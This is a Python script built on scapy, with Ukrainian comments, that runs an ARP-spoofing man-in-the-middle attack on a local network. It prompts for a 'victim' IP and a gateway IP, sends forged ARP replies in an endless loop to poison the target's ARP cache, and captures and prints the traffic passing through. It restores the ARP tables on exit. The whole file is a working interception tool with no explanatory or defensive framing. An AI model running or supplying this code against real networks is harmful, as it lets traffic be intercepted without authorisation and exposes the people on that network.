from scapy.all import ARP, Ether, sendp, sniff
import threading
import os

from scapy.sendrecv import srp


def get_mac(ip):
    """Отримує MAC-адресу для IP-адреси через ARP."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, host_ip):
    """Функція для відправлення фальшивих ARP-відповідей."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Не вдалося знайти MAC для {target_ip}")
        return

    # Підробка ARP
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    print(f"[+] Надсилаю спуфінг ARP-пакет для {target_ip}, видаючи себе за {host_ip}")
    while True:
        sendp(Ether(dst=target_mac)/packet, verbose=False)

def restore(target_ip, host_ip):
    """Відновлення коректних ARP-таблиць."""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        print("Не вдалося отримати MAC-адреси для відновлення")
        return

    # Відновлення
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    sendp(Ether(dst=target_mac)/packet, count=5, verbose=False)

def sniff_packets(interface):
    """Перехоплення пакетів."""
    print(f"[+] Перехоплення пакетів на інтерфейсі {interface}")
    packets = sniff(iface=interface, count=100, timeout=30)
    for packet in packets:
        print(packet.summary())

def main():
    target_ip = input("Введіть IP-адресу жертви: ")
    host_ip = input("Введіть IP-адресу шлюзу: ")
    interface = input("Введіть назву мережевого інтерфейсу (наприклад, eth0): ")

    try:
        # Запуск спуфінгу в окремому потоці
        spoof_thread = threading.Thread(target=spoof, args=(target_ip, host_ip))
        spoof_thread.start()

        # Захоплення пакетів
        sniff_packets(interface)
    except KeyboardInterrupt:
        print("[!] Завершення роботи. Відновлюю ARP-таблиці...")
        restore(target_ip, host_ip)
        os._exit(0)

if __name__ == "__main__":
    main()

